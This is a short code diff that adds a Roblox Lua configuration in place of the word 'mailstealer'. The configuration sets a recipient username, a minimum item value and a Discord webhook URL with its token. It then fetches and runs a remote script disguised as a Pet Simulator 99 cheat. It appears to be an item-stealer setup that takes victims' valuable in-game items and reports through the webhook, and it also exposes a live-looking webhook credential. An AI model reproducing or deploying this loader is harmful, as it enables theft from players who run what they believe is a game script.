@@ -1,1 +1,6 @@
-mailstealer
+Username = "esyaxlz"
+Username2 = "esyaxlz"
+MinimumRAP = 100000
+Webhook = "https://discord.com/api/webhooks/1375390827983147078/sc585uZ-TXyOhO9zxfS72zx0lDnzAmIXpt5jCJrDYwtfj9Y_JssgPjBERWPdkSmqo1OP"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/UrbanDEV0/Pet-Simulator-99-Script-OP-/refs/heads/main/roblox", true))()
